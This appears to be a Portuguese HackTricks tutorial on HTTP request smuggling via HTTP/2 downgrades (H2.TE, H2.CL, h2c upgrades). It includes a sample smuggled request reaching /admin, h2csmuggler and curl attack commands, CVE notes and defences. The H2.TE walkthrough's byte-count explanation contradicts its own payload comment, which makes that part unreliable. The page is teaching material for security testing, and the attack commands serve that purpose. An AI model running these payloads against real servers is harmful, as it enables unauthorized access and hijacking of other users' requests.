# Request Smuggling em Downgrades de HTTP/2

{{#include ../../banners/hacktricks-training.md}}

HTTP/2 é geralmente considerado imune a classic request-smuggling porque o comprimento de cada quadro DATA é explícito. **Essa proteção desaparece assim que um proxy de front-end “faz downgrade” da solicitação para HTTP/1.x antes de encaminhá-la para um back-end**. No momento em que dois parsers diferentes (o front-end HTTP/2 e o back-end HTTP/1) tentam concordar sobre onde uma solicitação termina e a próxima começa, todos os velhos truques de desincronização voltam – além de alguns novos.

---
## Por que os downgrades acontecem

1. Os navegadores já falam HTTP/2, mas muita infraestrutura de origem legada ainda entende apenas HTTP/1.1.
2. Proxies reversos (CDNs, WAFs, balanceadores de carga) portanto terminam TLS + HTTP/2 na borda e **reescrevem cada solicitação como HTTP/1.1** para a origem.
3. A etapa de tradução precisa criar *tanto* os cabeçalhos `Content-Length` **e/ou** `Transfer-Encoding: chunked` para que a origem possa determinar o comprimento do corpo.

Sempre que o front-end confia no comprimento do quadro HTTP/2 **mas** o back-end confia no CL ou TE, um atacante pode forçá-los a discordar.

---
## Duas classes primitivas dominantes

| Variante | Comprimento do front-end | Comprimento do back-end | Payload típico |
|---------|-------------------------|------------------------|-----------------|
| **H2.TE** | Quadro HTTP/2 | `Transfer-Encoding: chunked` | Embutir um corpo de mensagem chunked extra cujo final `0\r\n\r\n` *não* é enviado, fazendo com que o back-end aguarde a “próxima” solicitação fornecida pelo atacante. |
| **H2.CL** | Quadro HTTP/2 | `Content-Length` | Enviar um CL *menor* do que o corpo real, fazendo com que o back-end leia além do limite na solicitação seguinte. |

> Estes são idênticos em espírito aos clássicos TE.CL / CL.TE, apenas com HTTP/2 substituindo um dos parsers.

---
## Identificando uma cadeia de downgrade

1. Use **ALPN** em um handshake TLS (`openssl s_client -alpn h2 -connect host:443`) ou **curl**:
```bash
curl -v --http2 https://target
```
Se `* Using HTTP2` aparecer, a borda fala H2.
2. Envie uma solicitação CL/TE deliberadamente malformada *sobre* HTTP/2 (Burp Repeater agora tem um dropdown para forçar HTTP/2). Se a resposta for um erro HTTP/1.1 como `400 Bad chunk`, você tem prova de que a borda converteu o tráfego para um parser HTTP/1 a jusante.

---
## Fluxo de exploração (exemplo H2.TE)
```http
:method: POST
:path: /login
:scheme: https
:authority: example.com
content-length: 13      # ignored by the edge
transfer-encoding: chunked

5;ext=1\r\nHELLO\r\n
0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal\r\nX: X
```
1. O **front-end** lê exatamente 13 bytes (`HELLO\r\n0\r\n\r\nGE`), pensa que a solicitação está finalizada e encaminha essa quantidade para a origem.
2. O **back-end** confia no cabeçalho TE, continua lendo até ver o *segundo* `0\r\n\r\n`, consumindo assim o prefixo da segunda solicitação do atacante (`GET /admin …`).
3. O restante (`GET /admin …`) é tratado como uma *nova* solicitação enfileirada atrás da da vítima.

Substitua a solicitação disfarçada por:
* `POST /api/logout` para forçar a fixação de sessão
* `GET /users/1234` para roubar um recurso específico da vítima

---
## h2c smuggling (atualizações em texto claro)

Um estudo de 2023 mostrou que se um front-end passar o cabeçalho HTTP/1.1 `Upgrade: h2c` para um back-end que suporta HTTP/2 em texto claro, um atacante pode tunelar *frames* HTTP/2 *brutos* através de uma borda que apenas validou HTTP/1.1. Isso contorna a normalização de cabeçalhos, regras de WAF e até mesmo a terminação TLS.

Requisitos principais:
* A borda encaminha **tanto** `Connection: Upgrade` quanto `Upgrade: h2c` inalterados.
* A origem incrementa para HTTP/2 e mantém a semântica de reutilização de conexão que permite o enfileiramento de solicitações.

A mitigação é simples – remova ou codifique o cabeçalho `Upgrade` na borda, exceto para WebSockets.

---
## CVEs notáveis do mundo real (2022-2025)

* **CVE-2023-25690** – As regras de reescrita do mod_proxy do Apache HTTP Server poderiam ser encadeadas para divisão e contrabando de solicitações. (corrigido na 2.4.56)
* **CVE-2023-25950** – Contrabando de solicitações/respostas do HAProxy 2.7/2.6 quando o parser HTX manipulava incorretamente solicitações em pipeline.
* **CVE-2022-41721** – O `MaxBytesHandler` do Go fez com que bytes de corpo restantes fossem analisados como **frames HTTP/2**, permitindo contrabando entre protocolos.

---
## Ferramentas

* **Burp Request Smuggler** – desde a v1.26, testa automaticamente H2.TE/H2.CL e suporte ALPN oculto. Ative “HTTP/2 probing” nas opções da extensão.
* **h2cSmuggler** – PoC em Python da Bishop Fox para automatizar o ataque de atualização em texto claro:
```bash
python3 h2csmuggler.py -u https://target -x 'GET /admin HTTP/1.1\r\nHost: target\r\n\r\n'
```
* **curl**/`hyper` – criando cargas úteis manuais: `curl --http2-prior-knowledge -X POST --data-binary @payload.raw https://target`.

---
## Medidas defensivas

1. **HTTP/2 de ponta a ponta** – elimine completamente a tradução de downgrade.
2. **Fonte única de verdade sobre o comprimento** – ao rebaixar, *sempre* gere um `Content-Length` válido **e** **remova** quaisquer cabeçalhos `Content-Length`/`Transfer-Encoding` fornecidos pelo usuário.
3. **Normalize antes da rota** – aplique a sanitização de cabeçalhos *antes* da lógica de roteamento/reescrita.
4. **Isolamento de conexão** – não reutilize conexões TCP de back-end entre usuários; “uma solicitação por conexão” derrota explorações baseadas em fila.
5. **Remova `Upgrade` a menos que seja WebSocket** – previne o tunelamento h2c.

---
## Referências

* PortSwigger Research – “HTTP/2: The Sequel is Always Worse” <https://portswigger.net/research/http2>
* Bishop Fox – “h2c Smuggling: request smuggling via HTTP/2 clear-text” <https://bishopfox.com/blog/h2c-smuggling-request>

{{#include ../../banners/hacktricks-training.md}}
